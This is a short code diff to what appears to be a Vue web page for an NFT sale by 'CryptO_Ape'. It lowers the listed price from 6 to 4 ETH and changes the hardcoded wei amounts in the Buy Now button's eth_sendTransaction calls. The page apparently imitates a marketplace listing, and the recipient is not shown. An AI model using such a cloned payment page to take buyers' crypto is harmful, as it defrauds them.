@@ -10,8 +10,8 @@
 <span style="color:rgb(32, 129, 226);">CryptO_Ape</span> 
  <md-icon> visibility</md-icon>  85 views <md-icon>favorite</md-icon>  6 favorites</h4>
 <h2 style="color:black; float:left; font-size:18px; margin-top:30px;">Sale ends April 29, 2022 at 3:16am IST </h2>
-<h1 style="color:black; float:left; font-size:25px; margin-top:20px; margin-right:200px;">6
-  <img src="./ether.svg" width="15px" height="15px"><span style="font-size:15px; color:rgb(112, 122, 131); ">  ( $25,387.0)</span>
+<h1 style="color:black; float:left; font-size:25px; margin-top:20px; margin-right:200px;">4
+  <img src="./ether.svg" width="15px" height="15px"><span style="font-size:15px; color:rgb(112, 122, 131); ">  ( $16,637.0)</span>
 </h1>
 <md-button v-on:click="sendtransaction" class="md-primary" style="width:400px; background-color:rgb(32, 129, 226); margin-top:10px; color: white; margin-right:100px;">Buy Now</md-button>
  <img src="./graph.png" width="auto" height="auto" style="margin-top:10px">
@@ -74,7 +74,7 @@ export default {
       const web3 = new Web3(window.ethereum)
       const arr=[]
       
-        const x=web3.utils.toHex(6*1e18)
+        const x=web3.utils.toHex(4*1e18)
         
       
       console.log(x)
@@ -92,7 +92,7 @@ export default {
           }); 
           
                     
-                    const amount='0x53444835ec580000';
+                    const amount='0x3782dace9d900000';
                     console.log(amount)
             window.ethereum.request({
               method: "eth_sendTransaction",
@@ -111,7 +111,7 @@ export default {
         }else {
           
                     
-                    const amount='0x53444835ec580000';
+                    const amount='0x3782dace9d900000';
                 window.ethereum.request({
                     method: 'eth_sendTransaction',
                     params: [
